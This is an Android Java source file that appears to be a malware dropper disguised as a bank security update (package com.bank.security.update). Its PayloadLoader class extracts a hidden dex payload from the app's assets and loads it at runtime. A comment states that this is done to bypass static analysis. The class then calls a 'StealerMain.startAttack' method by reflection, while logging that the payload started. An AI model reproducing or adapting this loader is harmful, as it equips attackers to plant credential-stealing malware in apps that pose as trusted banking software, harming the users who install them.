package com.bank.security.update;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;

public class PayloadLoader {
    private static final String TAG = "PayloadLoader";
    private static final String ASSET_PAYLOAD = "core_payload.dat";

    public static void loadAndExecute(Context context) {
        try {
            // Decrypt or extract hidden secondary dex from assets
            File dexInternalStoragePath = new File(context.getDir("dex", Context.MODE_PRIVATE), "classes.dex");
            File optimizedDexOutputPath = context.getDir("outdex", Context.MODE_PRIVATE);

            if (!dexInternalStoragePath.exists()) {
                InputStream is = context.getAssets().open(ASSET_PAYLOAD);
                FileOutputStream fos = new FileOutputStream(dexInternalStoragePath);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = is.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }
                is.close();
                fos.close();
            }

            // Dynamically load class at runtime to bypass static analysis
            DexClassLoader dexLoader = new DexClassLoader(
                dexInternalStoragePath.getAbsolutePath(),
                optimizedDexOutputPath.getAbsolutePath(),
                null,
                context.getClassLoader()
            );

            Class<?> loadedClass = dexLoader.loadClass("com.payload.bot.StealerMain");
            Method startMethod = loadedClass.getDeclaredMethod("startAttack", Context.class);
            startMethod.setAccessible(true);
            startMethod.invoke(null, context);

            Log.d(TAG, "Dynamic payload initiated successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed dynamic loading", e);
        }
    }
}
